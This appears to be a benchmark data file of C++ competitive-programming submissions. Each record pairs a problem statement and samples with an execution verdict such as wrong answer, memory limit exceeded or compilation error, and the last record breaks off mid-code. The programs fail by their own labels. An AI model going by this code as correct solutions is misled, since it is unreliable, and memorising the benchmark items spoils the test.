{"difficulty":2300,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"aad7ebf4fa919fae78bfc878e47e483c","submission_id":"re_946","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\nusing namespace std;\n\nint main(){\n\n\tios_base::sync_with_stdio(false);\n    \tcin.tie(NULL);\n\n\tint n,m;\n\tcin>>n>>m;\n\tunsigned long long int countInt=0, countIr=0;\n\tif(2*n-1>=m)\n\t{\n\t\tif(m%2==1)\n\t\t{\n\t\t\tcountInt+=(m-1)\/2+1;\n\t\t\tif((m-1)%4==0)\n\t\t\t{\n\t\t\t\tcountInt+=(m-1)\/4;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcountInt+=((m-1)\/2-1)\/2;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcountInt+=m\/2;\n\t\t\tif(m%4==0)\n\t\t\t{\n\t\t\t\tcountInt+=m\/4;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcountInt+=(m\/2-1)\/2;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tcountInt+=n;\n\t\tif(m%2==1)\n\t\t{\n\t\t\tif(((m-1)\/2)%2==1)\n\t\t\t{\n\t\t\t\tcountInt+=n-max(1,(n-((m-1)\/2-1)\/2));\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcountInt+=n-max(1,n-(m-1)\/4);\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif(m\/2%2==1)\n\t\t\t{\n\t\t\t\tcountInt+=n-max(1,n-(m\/2-1)\/2);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcountInt+=n-max(1,n-m\/4);\n\t\t\t}\n\t\t\t\n\t\t}\t\n\t}\n\tfor(int b=1;b<=n;b++)\n\t{\n\t\tif(b*b<=m)\n\t\t{\n\t\t\tcountIr+=b*b-b;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tint countk=b-ceil(sqrt(b*b-m));\n\t\t\tcountIr+=m-countk;\n\n\t\t}\n\t\t\n\t}\n\tcountIr*=2;\n\tcout<<countIr+countInt<<endl;\n\treturn 0;\n}\n","description":"A schoolboy Petya studies square equations. The equations that are included in the school curriculum, usually look simple: x2\u2009+\u20092bx\u2009+\u2009c\u2009=\u20090 where b, c are natural numbers.Petya noticed that some equations have two real roots, some of them have only one root and some equations don't have real roots at all. Moreover it turned out that several different square equations can have a common root.Petya is interested in how many different real roots have all the equations of the type described above for all the possible pairs of numbers b and c such that 1\u2009\u2264\u2009b\u2009\u2264\u2009n, 1\u2009\u2264\u2009c\u2009\u2264\u2009m. Help Petya find that number.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains two integers n and m. (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u20095000000).","output_spec":"Print a single number which is the number of real roots of the described set of equations.","notes":"NoteIn the second test from the statement the following equations are analysed: b\u2009=\u20091, c\u2009=\u20091: x2\u2009+\u20092x\u2009+\u20091\u2009=\u20090; The root is x\u2009=\u2009\u2009-\u20091 b\u2009=\u20091, c\u2009=\u20092: x2\u2009+\u20092x\u2009+\u20092\u2009=\u20090; No roots Overall there's one rootIn the second test the following equations are analysed: b\u2009=\u20091, c\u2009=\u20091: x2\u2009+\u20092x\u2009+\u20091\u2009=\u20090; The root is x\u2009=\u2009\u2009-\u20091 b\u2009=\u20091, c\u2009=\u20092: x2\u2009+\u20092x\u2009+\u20092\u2009=\u20090; No roots b\u2009=\u20091, c\u2009=\u20093: x2\u2009+\u20092x\u2009+\u20093\u2009=\u20090; No roots b\u2009=\u20092, c\u2009=\u20091: x2\u2009+\u20094x\u2009+\u20091\u2009=\u20090; The roots are  b\u2009=\u20092, c\u2009=\u20092: x2\u2009+\u20094x\u2009+\u20092\u2009=\u20090; The roots are  b\u2009=\u20092, c\u2009=\u20093: x2\u2009+\u20094x\u2009+\u20093\u2009=\u20090; The roots are x1\u2009=\u2009\u2009-\u20093,\u2009x2\u2009=\u2009\u2009-\u20091 b\u2009=\u20093, c\u2009=\u20091: x2\u2009+\u20096x\u2009+\u20091\u2009=\u20090; The roots are  b\u2009=\u20093, c\u2009=\u20092: x2\u2009+\u20096x\u2009+\u20092\u2009=\u20090; The roots are  b\u2009=\u20093, c\u2009=\u20093: x2\u2009+\u20096x\u2009+\u20093\u2009=\u20090; The roots are  Overall there are 13 roots and as the root \u2009-\u20091 is repeated twice, that means there are 12 different roots.","sample_inputs":["3 3","1 2"],"sample_outputs":["12","1"]}
{"difficulty":2700,"lang":"GNU C++","lang_cluster":"c++","src_uid":"ab410c6513a26ec3a41c63318dc38b78","submission_id":"re_425","tags":["probabilities","math","matrices"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include<iostream>\n#include<cstdio>\n#include<cstdlib>\n#include<cstring>\n#include<cmath>\n#include<cctype>\n#include<algorithm>\n\nusing namespace std;\n\nconst double eps = 1e-8;\nconst int MaxN = 25, MaxSize = MaxN * MaxN;\n\nint N, M, SA, SB, tot;\nbool g[MaxN][MaxN];\nint deg[MaxN];\ndouble P[MaxN], ans[MaxSize];\n\nint lab(int a, int b) {\n    return (a - 1) * N + (b - 1);\n}\n\nstruct Matrix {\n    double a[MaxSize][MaxSize];\n    void init() {\n        for (int i = 0; i < tot; ++i)\n            for (int j = 0; j <= tot; ++j) \n                a[i][j] = 0;\n        for (int i = 0; i < tot; ++i)\n            a[i][i] = 1;\n        a[lab(SA, SB)][tot] = 1;\n        for (int i = 1; i <= N; ++i)\n            for (int j = 1; j <= N; ++j) \n                    for (int ii = 1; ii <= N; ++ii)\n                        for (int jj = 1; jj <= N; ++jj) if (ii != jj && g[i][ii] && g[j][jj]) {\n                            double pi = (i == ii) * P[ii] + (i != ii) * (1 - P[ii]) \/ deg[ii];\n                            double pj = (j == jj) * P[jj] + (j != jj) * (1 - P[jj]) \/ deg[jj];\n                            int t1 = lab(i, j), t2 = lab(ii, jj);\n                            a[t1][t2] -= pi * pj;\n                        }         \n    }  \n    void elimiate() {\n        int i, j, k, p;\n        for (i = 0, j = 0; i < tot; ++i, ++j) {\n            for (k = i; k < tot; ++k) if (fabs(a[k][j]) > eps) break;\n            for (p = i; p <= tot; ++p) swap(a[i][p], a[k][p]);\n            for (k = i + 1; k < tot; ++k) if (fabs(a[k][j]) > eps) {\n                double t = a[k][j] \/ a[i][j];\n                for (p = j; p <= tot; ++p) \n                    a[k][p] = a[k][p] - a[i][p] * t; \n            }\n        }\n    } \n    void solve() {\n        for (int i = tot - 1; i >= 0; --i) {\n            ans[i] = a[i][tot];\n            for (int j = i + 1; j < tot; ++j)\n                ans[i] -= ans[j] * a[i][j];\n            ans[i] \/= a[i][i];\n        }\n    }    \n}mat;\n\nint main() {\n\n    scanf(\"%d%d%d%d\", &N, &M, &SA, &SB);\n    tot = N * N;\n    int x, y;\n    memset(g, 0, sizeof(g));\n    memset(deg, 0, sizeof(deg));\n    for (int i = 1; i <= N; ++i) g[i][i] = true;\n    for (int i = 0; i < M; ++i) {\n        scanf(\"%d%d\", &x, &y);\n        g[x][y] = g[y][x] = true;\n        deg[x]++; deg[y]++;\n    }\n    for (int i = 1; i <= N; ++i) scanf(\"%lf\", P + i);\n    mat.init();\n    mat.elimiate();\n    mat.solve();\n    for (int i = 1; i < N; ++i) printf(\"%.8f \", ans[lab(i, i)]);\n    printf(\"%.8f\\n\", ans[lab(N, N)]);\n\n    return 0;\n\n}\n","description":"One day as Petya and his friend Vasya were having one of their numerous trips, they decided to visit a museum castle. The museum has a specific shape: it consists of n rooms connected with m corridors so that one can access any room from any other one.After the two friends had a little walk around the museum, they decided to split and watch the pieces of art each of them found interesting. They agreed to meet in one of the rooms at six p.m. However, they forgot one quite essential thing: they didn't specify the place to meet and when the time came, they started to rush about the museum looking for each other (they couldn't call each other as roaming made a call's cost skyrocket).Yet, even despite the whole rush, they couldn't get enough of the pieces of art, that's why each of them has the following strategy: each minute he make a decision where to go \u2014 with probability pi he doesn't move to any other place during this minute (i.e. he stays in the room). With probability 1\u2009-\u2009pi he equiprobably choose one of the adjacent rooms and went there along the corridor. Here i is the ordinal number of the current room. Building was expensive in ancient times, that's why each corridor connected two different rooms, and any two rooms had no more than one corridor between them. The boys act simultaneously. As the corridors are dark, it is impossible to meet there; however, one can walk along the corridors in both directions (besides, the two boys can be going through the same corridor simultaneously without meeting). The boys act like that until they meet each other. More formally, the two friends meet when at some moment of time both of them decided to appear in the same room.For each room find the probability that the boys will meet there considering that at 6 p.m. they are positioned in rooms a and b correspondingly.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four integers: n (1\u2009\u2264\u2009n\u2009\u2264\u200922), representing the numbers of rooms; m , representing the number of corridors; a,\u2009b (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n), representing the numbers of Petya's and Vasya's starting rooms correspondingly. Next m lines contain pairs of numbers \u2014 the numbers of rooms connected by a corridor. Next n lines contain probabilities pi (0.01\u2009\u2264\u2009pi\u2009\u2264\u20090.99) with the accuracy of up to four digits after the decimal point \u2014 the probability to stay in room i. It is guaranteed that every room can be reached from every other room by corridors.","output_spec":"In the only line print n space-separated numbers, the i-th number should represent the probability that the friends meet in the i-th room with absolute or relative error of no more than 10\u2009-\u20096.","notes":"NoteIn the first sample the museum is symmetric. That means the probabilities to meet in rooms 1 and 2 are equal. And their sum equals to one. So, each probability equals 0.5.","sample_inputs":["2 1 1 2\n1 2\n0.5\n0.5","4 4 1 2\n1 2\n2 3\n3 4\n4 1\n0.5\n0.5\n0.5\n0.5"],"sample_outputs":["0.5000000000 0.5000000000","0.3333333333 0.3333333333 0.1666666667 0.1666666667"]}
{"difficulty":2600,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"b8b3f75baaef9c4232e7fd7555d4fabb","submission_id":"re_13","tags":["dp","combinatorics","probabilities","math"],"exec_outcome":"COMPILATION_ERROR","source_code":"#include <bits\/stdc++.h>\n#pragma GCC optimize(\"Ofast\")\nusing namespace std;\n#define sync()      ios_base::sync_with_stdio(0);cin.tie(0);cout.tie(0)\n#define fileIO()    freopen(\"input.txt\", \"r\", stdin),freopen(\"output.txt\", \"w\", stdout)\n#define F           first\n#define S           second\n#define ers         erase\n#define ins         insert\n#define db          pop_back\n#define pb          push_back\n#define df          pop_front\n#define pf          push_front\n#define SZ(x)       ((ll)x.size())\n#define sqr(x)      (x)*(x)\n#define Blz(x)      __builtin_clz(x)\n#define Brz(x)      __builtin_ctz(x)\n#define Bones(x)    __builtin_popcount(x)\n#define all(x)      x.begin(),x.end()\n#define kill(x)     return cout<<x,0\n#define dbgp(x)     cerr<< #x << \" = \" << x.F << \", \" << x.S << endl\n#define dbg(x)      cerr<< #x << \" = \" << x << endl\n#define ddbg(i,x)   cerr<< #i << \" = \" << i << \" \/ \"; dbg(x[i])\n#define tdbg(i,E,x) cerr<< #i << \" = \" << i << \" \/ \"; ddbg(E,x[i])\ntypedef long long                                 ll;\ntypedef long double                               ld;\ntypedef unsigned short int                        usi;\ntypedef pair<long long,bool>                      plb;\ntypedef pair<long long,long long>                 pll;\ntypedef string                                    str;\ntypedef priority_queue<ll>                        maxheap;\ntypedef priority_queue<ll,vector<ll>,greater<ll>> minheap;\ntypedef priority_queue<pll,vector<pll>,greater<pll>> dEq;\nconst ll maxn=1e3+10, inf=2e9, mod=1e9+7; const ld pi=3.14159265359, eps=1e-9;\n\/\/\/**************************************\nll fac[maxn],inv[maxn];\nll mdc(ll n){\n    while(n<0){n+=mod;}\n    return n%mod;\n}\nll pwm(ll a,ll b){\n\tif(b==0){return 1;}\n\tif(b%2){return mdc(a*pwm(a,b-1));}\n\treturn pwm(mdc(a*a),b\/2);\n}\nll C(ll n,ll r){\n    if(r>n){return 0;}\n\treturn mdc(mdc(fac[n]*inv[r])*inv[n-r]);\n}\n\/\/\/**************************************\nll n,m;\nbool is[maxn];\nll revc[maxn];\nld dp[maxn][maxn],pd[maxn][maxn];\nint main(){\n    sync();\n    \/\/\/**************************************\n\tfac[0]=inv[0]=1;\n\tfor(int i=1;i<maxn;i++) fac[i]=mdc(i*fac[i-1]);\n\tfor(int i=1;i<maxn;i++) inv[i]=mdc(inv[i-1]*pwm(i,mod-2));\n    \/\/\/**************************************\n    cin>>n>>m;\n    vector<ll> g[maxn];\n    ll kl[maxn],po=0;\n    ll k,jens=0;\n    for(int i=1;i<=m;i++){\n        cin>>k; jens+=k;\n        for(int j=0;j<k;j++){ cin>>kl[po++]; g[i].pb(kl[po-1]); }\n    }\n    sort(kl,kl+jens,greater<ll>());\n    ll h=kl[n-1]; \/\/dbg(h);\n\n    ld fp=1; ll som=0,mos=0;\n    for(int i=1;i<=m;i++){\n        for(ll x:g[i]) is[i]|=(x==h), revc[i]+=(x>h);\n        mos+=is[i];\n        fp\/=C(SZ(g[i]),revc[i]);\n        som+=revc[i];\n    }\n    for(int i=0;i<=m;i++) dp[i][0]=pd[i][0]=fp;\n    for(int i=1;i<=m;i++)for(int j=1;j<=n;j++){\n        dp[i][j]=dp[i-1][j];\n        if(is[i]) dp[i][j]+=dp[i-1][j-1]*(revc[i]+1)\/(SZ(g[i])-revc[i]);\n        tdbg(i,j,dp);\n    }\n    cout<<fixed<<setprecision(18)<<(dp[m][n-som]\/C(mos,n-som);\n    return 0;\n}\n\/**\n (                            )   (   )\n )\\ )             (      )  ( \/(  () \/(\n(()\/(  (  (    (  )\\  ( \/(  )\\()) )\\ ())\n \/(_))_)  )\\   )\\((_) )(_))(_)\\) ((_)(_)\n(_)) __| ((_) ((_)| |((_)_)| |(_)| |_| |\n  | (_ |\/ _ \\\/ _ \\| |\/ _` || \/ \/ |  _  |\n   \\___|\\___\/\\___\/|_|\\__,_||_\\_\\ |_| |_|\n**\/\n","description":"Once upon a time an old man and his wife lived by the great blue sea. One day the old man went fishing and caught a real live gold fish. The fish said: \"Oh ye, old fisherman! Pray set me free to the ocean and I will grant you with n gifts, any gifts you wish!\". Then the fish gave the old man a list of gifts and their prices. Some gifts on the list can have the same names but distinct prices. However, there can't be two gifts with the same names and the same prices. Also, there can be gifts with distinct names and the same prices. The old man can ask for n names of items from the list. If the fish's list has p occurrences of the given name, then the old man can't ask for this name of item more than p times.The old man knows that if he asks for s gifts of the same name, the fish will randomly (i.e. uniformly amongst all possible choices) choose s gifts of distinct prices with such name from the list. The old man wants to please his greedy wife, so he will choose the n names in such a way that he can get n gifts with the maximum price. Besides, he isn't the brightest of fishermen, so if there are several such ways, he chooses one of them uniformly.The old man wondered, what is the probability that he can get n most expensive gifts. As the old man isn't good at probability theory, he asks you to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u20091000) \u2014 the number of the old man's wishes and the number of distinct names in the goldfish's list, correspondingly. Then m lines follow: the i-th line first contains integer ki (ki\u2009&gt;\u20090)\u00a0\u2014 the number of distinct prices of gifts with the i-th name, then ki distinct space-separated integers cij (1\u2009\u2264\u2009cij\u2009\u2264\u2009109), the gifts' prices.  It is guaranteed that the sum of all ki doesn't exceed 1000. It is guaranteed that n is not greater than the total number of the gifts.","output_spec":"On a single line print one real number \u2014 the probability of getting n most valuable gifts. The answer will be considered correct if its absolute or relative error does not exceed 10\u2009-\u20099.","notes":null,"sample_inputs":["3 1\n3 10 20 30","3 2\n1 40\n4 10 20 30 40"],"sample_outputs":["1.000000000","0.166666667"]}
{"difficulty":2600,"lang":"GNU C++14","lang_cluster":"c++","src_uid":"ba9c136f84375cd317f0f8b53e3939c7","submission_id":"re_553","tags":["dp","probabilities"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<bits\/stdc++.h>\n\nusing namespace std;\nusing lint = long long int;\n\nconst int MAX_N = 2e5;\nconst int MAX_M =  3001;\nconst lint MOD = 998244353;\n\nlint dp1[MAX_M][MAX_M];\nlint dp2[MAX_M][MAX_M];\nint state[MAX_N];\nlint wi[MAX_N];\nlint SA, SB;\n\nlint pow(lint x, lint N) {\n\tlint ret = 1;\n\n\twhile (N) {\n\t\tif (N & 1) \n\t\t\t(ret *= x) %= MOD;\n\t\t(x *= x) %= MOD;\n\t\tN >>= 1;\n\t}\n\treturn ret;\n}\n\nlint inv(lint x) {\n\treturn pow(x, MOD-2);\n}\n\nlint solve1(int i, int j, int M) {\n\tif (dp1[i][j] != -1)\n\t\treturn dp1[i][j];\n\n\tlint &ret = dp1[i][j];\n\tret = 0;\n\n\n\tif (i+j == M)\n\t\treturn ret = 1;\n\t\n\tlint ri = SA + i, rj = SB - j;\n\t(ret += solve1(i+1, j, M) * (ri + 1) % MOD * inv(ri+rj) % MOD) %= MOD;\n\tif (SB-j-1 >= 0)\n\t\t(ret += solve1(i, j+1, M) * rj % MOD * inv(ri+rj) % MOD) %= MOD;\n\n\treturn ret;\n}\n\nlint solve2(int i, int j, int M) {\n\tif (dp2[i][j] != -1)\n\t\treturn dp2[i][j];\n\n\tlint &ret = dp2[i][j];\n\tret = 0;\n\n\tif (i+j == M)\n\t\treturn ret = 1;\n\n\tlint ri = SA + i, rj = SB - j;\n\t\n\tif (rj-1 >= 0) \n\t\t(ret += solve2(i, j+1, M) * (rj - 1) % MOD * inv(ri+rj) % MOD) %= MOD;\n\t(ret += solve2(i+1, j, M) * ri % MOD * inv(ri+rj) % MOD) %= MOD;\n\n\treturn ret;\n}\n\nint main(void) {\n\tios_base::sync_with_stdio(false), cin.tie(NULL);\n\tmemset(dp1, -1, sizeof dp1);\n\tmemset(dp2, -1, sizeof dp2);\n\n\tint N, M;\tcin >> N >> M;\n\n\tfor (int i = 0; i < N; i ++) \n\t\tcin >> state[i];\n\n\tfor (int i = 0; i < N; i ++) {\n\t\tcin >> wi[i];\n\n\t\t(state[i]?SA:SB) += wi[i];\n\t}\n\n\tfor (int i = 0; i < N; i ++) \n\t\tcout << (wi[i]*(state[i]?solve1(0, 0, M):solve2(0, 0, M)))%MOD << '\\n';\n}\n","description":"The only difference between easy and hard versions is constraints.Nauuo is a girl who loves random picture websites.One day she made a random picture website by herself which includes $$$n$$$ pictures.When Nauuo visits the website, she sees exactly one picture. The website does not display each picture with equal probability. The $$$i$$$-th picture has a non-negative weight $$$w_i$$$, and the probability of the $$$i$$$-th picture being displayed is $$$\\frac{w_i}{\\sum_{j=1}^nw_j}$$$. That is to say, the probability of a picture to be displayed is proportional to its weight.However, Nauuo discovered that some pictures she does not like were displayed too often. To solve this problem, she came up with a great idea: when she saw a picture she likes, she would add $$$1$$$ to its weight; otherwise, she would subtract $$$1$$$ from its weight.Nauuo will visit the website $$$m$$$ times. She wants to know the expected weight of each picture after all the $$$m$$$ visits modulo $$$998244353$$$. Can you help her?The expected weight of the $$$i$$$-th picture can be denoted by $$$\\frac {q_i} {p_i}$$$ where $$$\\gcd(p_i,q_i)=1$$$, you need to print an integer $$$r_i$$$ satisfying $$$0\\le r_i&lt;998244353$$$ and $$$r_i\\cdot p_i\\equiv q_i\\pmod{998244353}$$$. It can be proved that such $$$r_i$$$ exists and is unique.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$m$$$ ($$$1\\le n\\le 2\\cdot 10^5$$$, $$$1\\le m\\le 3000$$$) \u2014 the number of pictures and the number of visits to the website. The second line contains $$$n$$$ integers $$$a_1,a_2,\\ldots,a_n$$$ ($$$a_i$$$ is either $$$0$$$ or $$$1$$$) \u2014 if $$$a_i=0$$$ , Nauuo does not like the $$$i$$$-th picture; otherwise Nauuo likes the $$$i$$$-th picture. It is guaranteed that there is at least one picture which Nauuo likes. The third line contains $$$n$$$ positive integers $$$w_1,w_2,\\ldots,w_n$$$ ($$$w_i \\geq 1$$$) \u2014 the initial weights of the pictures. It is guaranteed that the sum of all the initial weights does not exceed $$$998244352-m$$$.","output_spec":"The output contains $$$n$$$ integers $$$r_1,r_2,\\ldots,r_n$$$ \u2014 the expected weights modulo $$$998244353$$$.","notes":"NoteIn the first example, if the only visit shows the first picture with a probability of $$$\\frac 2 3$$$, the final weights are $$$(1,1)$$$; if the only visit shows the second picture with a probability of $$$\\frac1 3$$$, the final weights are $$$(2,2)$$$.So, both expected weights are $$$\\frac2 3\\cdot 1+\\frac 1 3\\cdot 2=\\frac4 3$$$ .Because $$$332748119\\cdot 3\\equiv 4\\pmod{998244353}$$$, you need to print $$$332748119$$$ instead of $$$\\frac4 3$$$ or $$$1.3333333333$$$.In the second example, there is only one picture which Nauuo likes, so every time Nauuo visits the website, $$$w_1$$$ will be increased by $$$1$$$.So, the expected weight is $$$1+2=3$$$.Nauuo is very naughty so she didn't give you any hint of the third example.","sample_inputs":["2 1\n0 1\n2 1","1 2\n1\n1","3 3\n0 1 1\n4 3 5"],"sample_outputs":["332748119\n332748119","3","160955686\n185138929\n974061117"]}
{"difficulty":1600,"lang":"MS C++","lang_cluster":"c++","src_uid":"c761bb69cf1b5a3dbe38d9f5c46e9007","submission_id":"re_179","tags":["data structures","constructive algorithms","implementation"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include <cstdio>\n#include <cstdlib>\n#include <iostream>\n#include <math.h>\n#include <string.h>\n#include <algorithm>\n#include <cstring>\n#include <vector>\n#include <map>\n#include <ctime>\n\nusing namespace std;\n\ntypedef long long i64;\n\nint main()\n{\n\tint n,tr,lie;\n\tcin >> n >> tr;\n\tlie=n-tr;\n\tint kolp=0,kolz=0;\n\tchar tmp,zn;\n\tint pip;\n\tvector< vector<int> > zash(n);\n\tvector< vector<int> > podozr(n);\n\tfor (int i=0;i<n;i++)\n\t{\n\t\tscanf(\"%c%c%d\",&tmp,&zn,&pip);\n\t\tpip--;\n\t\tif (zn=='-')\n\t\t{\n\t\t\tkolz++;\n\t\t\tzash[pip].push_back(i);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tkolp++;\n\t\t\tpodozr[pip].push_back(i);\n\t\t}\n\t}\n\tvector<int> saystrue(n,0);\n\tvector<int> isbad(n,0);\n\tint bad=-1;\n\tbool waschange=true;\n\twhile (waschange)\n\t{\n\t\twaschange=false;\n\t\tif (kolz>tr)\n\t\t{\n\t\t\tfor (int i=0;i<n;i++)\n\t\t\t\tif (zash[i].empty())\n\t\t\t\t{\n\t\t\t\t\tisbad[i]=-1;\n\t\t\t\t\tfor (int j=0;j<podozr[i].size();j++)\n\t\t\t\t\t{\n\t\t\t\t\t\tsaystrue[podozr[i][j]]=-1;\n\t\t\t\t\t\twaschange=true;\n\t\t\t\t\t}\n\t\t\t\t\tkolp-=podozr[i].size();\n\t\t\t\t\tpodozr[i].clear();\n\t\t\t\t}\n\t\t}\n\t\tfor (int i=0;i<n;i++)\n\t\t{\n\t\t\tif (zash[i].size()>tr || podozr[i].size()>lie)\n\t\t\t{\n\t\t\t\tbad=i;\n\t\t\t\tisbad[i]=1;\n\t\t\t\t\/*for (int j=0;j<zash[i].size();j++)\n\t\t\t\t\tsaystrue[zash[i][j]]=-1;\n\t\t\t\tfor (int j=0;j<podozr[i].size();j++)\n\t\t\t\t\tsaystrue[podozr[i][j]]=1;\n\t\t\t\ttr-=podozr[i].size();\n\t\t\t\tlie-=zash[i].size();\n\t\t\t\twaschange=true;\n\t\t\t\t*\/\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse\n\t\t\t\tif (podozr[i].size()>tr || zash[i].size()>lie)\n\t\t\t\t{\n\t\t\t\t\tisbad[i]=-1;\n\t\t\t\t\tfor (int j=0;j<zash[i].size();j++)\n\t\t\t\t\t{\n\t\t\t\t\t\tsaystrue[zash[i][j]]=1;\n\t\t\t\t\t\twaschange=true;\n\t\t\t\t\t}\n\t\t\t\t\tfor (int j=0;j<podozr[i].size();j++)\n\t\t\t\t\t{\n\t\t\t\t\t\tsaystrue[podozr[i][j]]=-1;\n\t\t\t\t\t\twaschange=true;\n\t\t\t\t\t}\n\t\t\t\t\ttr-=zash[i].size();\n\t\t\t\t\tkolz-=zash[i].size();\n\t\t\t\t\tlie-=podozr[i].size();\n\t\t\t\t\tkolp-=podozr[i].size();\n\t\t\t\t\tzash[i].clear();\n\t\t\t\t\tpodozr[i].clear();\n\t\t\t\t}\n\t\t}\n\t\tif (bad!=-1)\n\t\t{\n\t\t\tfor (int i=0;i<n;i++)\n\t\t\t\tif (isbad[i]==1)\n\t\t\t\t{\n\t\t\t\t\tfor (int j=0;j<zash[i].size();j++)\n\t\t\t\t\t\tsaystrue[zash[i][j]]=-1;\n\t\t\t\t\tfor (int j=0;j<podozr[i].size();j++)\n\t\t\t\t\t\tsaystrue[podozr[i][j]]=1;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tfor (int j=0;j<zash[i].size();j++)\n\t\t\t\t\t\tsaystrue[zash[i][j]]=1;\n\t\t\t\t\tfor (int j=0;j<podozr[i].size();j++)\n\t\t\t\t\t\tsaystrue[podozr[i][j]]=-1;\n\t\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n\tfor (int i=0;i<n;i++)\n\t\tif (saystrue[i]==1) printf(\"Truth\\n\");\n\t\telse\n\t\t\tif (saystrue[i]==-1) printf(\"Lie\\n\");\n\t\t\telse\n\t\t\t\tprintf(\"Not defined\\n\");\n\treturn 0;\n}\n","description":"As Sherlock Holmes was investigating a crime, he identified n suspects. He knows for sure that exactly one of them committed the crime. To find out which one did it, the detective lines up the suspects and numbered them from 1 to n. After that, he asked each one: \"Which one committed the crime?\". Suspect number i answered either \"The crime was committed by suspect number ai\", or \"Suspect number ai didn't commit the crime\". Also, the suspect could say so about himself (ai\u2009=\u2009i).Sherlock Holmes understood for sure that exactly m answers were the truth and all other answers were a lie. Now help him understand this: which suspect lied and which one told the truth?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009n) \u2014 the total number of suspects and the number of suspects who told the truth. Next n lines contain the suspects' answers. The i-th line contains either \"+ai\" (without the quotes), if the suspect number i says that the crime was committed by suspect number ai, or \"-ai\" (without the quotes), if the suspect number i says that the suspect number ai didn't commit the crime (ai is an integer, 1\u2009\u2264\u2009ai\u2009\u2264\u2009n). It is guaranteed that at least one suspect exists, such that if he committed the crime, then exactly m people told the truth.","output_spec":"Print n lines. Line number i should contain \"Truth\" if suspect number i has told the truth for sure. Print \"Lie\" if the suspect number i lied for sure and print \"Not defined\" if he could lie and could tell the truth, too, depending on who committed the crime.","notes":"NoteThe first sample has the single person and he confesses to the crime, and Sherlock Holmes knows that one person is telling the truth. That means that this person is telling the truth.In the second sample there are three suspects and each one denies his guilt. Sherlock Holmes knows that only two of them are telling the truth. Any one of them can be the criminal, so we don't know for any of them, whether this person is telling the truth or not.In the third sample the second and the fourth suspect defend the first and the third one. But only one is telling the truth, thus, the first or the third one is the criminal. Both of them can be criminals, so the second and the fourth one can either be lying or telling the truth. The first and the third one are lying for sure as they are blaming the second and the fourth one.","sample_inputs":["1 1\n+1","3 2\n-1\n-2\n-3","4 1\n+2\n-3\n+4\n-1"],"sample_outputs":["Truth","Not defined\nNot defined\nNot defined","Lie\nNot defined\nLie\nNot defined"]}
{"difficulty":2400,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"c9274249c26b1a85c19ab70d91c1c3e0","submission_id":"212493439","tags":["bitmasks","dp","math","probabilities"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<bits\/stdc++.h>\nusing namespace std;\n#define int long long\n#define f(i,j,k) for(register int i=j;i<=k;++i)\n#define g(i,j,k) for(register int i=j;i>=k;--i)\nint n,m,s,l;\ndouble f[606][303][2],g[606][303][2];\n\/\/f[j][k][t]\u00e8\u00a1\u00a8\u00e7\u00a4\u00bai\u00e6\u00ac\u00a1\u00e6\u0093\u008d\u00e4\u00bd\u009c\u00ef\u00bc\u008c\u00e6\u00b2\u00a1\u00e6\u009c\u0089\u00e9\u0080\u009a\u00e8\u00bf\u0087\u00e5\u008a\u00a0\u00e6\u00b3\u0095\u00e8\u00bf\u009b\u00e4\u00bd\u008d\u00e5\u0088\u00b0512\u00ef\u00bc\u008c\u00e6\u0095\u00b0\u00e5\u0080\u00bc\u00e6\u0098\u00afj\u00ef\u00bc\u008c\u00e4\u00b8\u0094\u00e5\u0090\u008e\u00e9\u009d\u00a2\u00e6\u009c\u0089k\u00e4\u00b8\u00aa\u00e8\u00bf\u009e\u00e7\u009d\u0080\u00e7\u009a\u0084t=0\/1\ninline int clac(int x){\n\tif(!x)return 0;\n\tint p=x&1,q=0;\n\tfor(;p==(x&1);x\/=2)++q;\n\treturn q;\n}\ninline int len(int x,int y=0){for(;x%2==0;x\/=2)++y;return y;}\nsigned main(){\n\tcin>>s>>n>>l;\n\tdouble p=0.01*l,q=0.01*(100-l);\n\tf[s&511][clac(s\/512)][s&512]=1;\n\tf(i,1,n){\n\t\tf(j,0,511)f(k,0,n+50)f(t,0,1){\n\t\t\tl=j*2;\n\t\t\tg[l&511][(t==(l&512))?k+1:1][(l>>9)&1]+=f[j][k][t]*p;\n\t\t\tl=j+1;\n\t\t\tif(l&512){\n\t\t\t\tif(t)g[l&511][k][0]+=f[j][k][t]*q;\n\t\t\t\telse g[l&511][1][1]+=f[j][k][t]*q;\n\t\t\t}else{\n\t\t\t\tg[l][k][t]+=f[j][k][t]*q;\n\t\t\t}\n\t\t}\n\t\tf(j,0,511)f(k,0,n+50)f(t,0,1)f[j][k][t]=g[j][k][t],g[j][k][t]=0;\n\t}\n\tdouble ans=0,x=0;\n\tf(j,0,511)f(k,0,n+50)f(t,0,1){\n\t\tx=j?len(j):((t?0:k)+9);\n\/\/\t\tif(f[j][k][t])cout<<x<<\" \"<<j<<\" 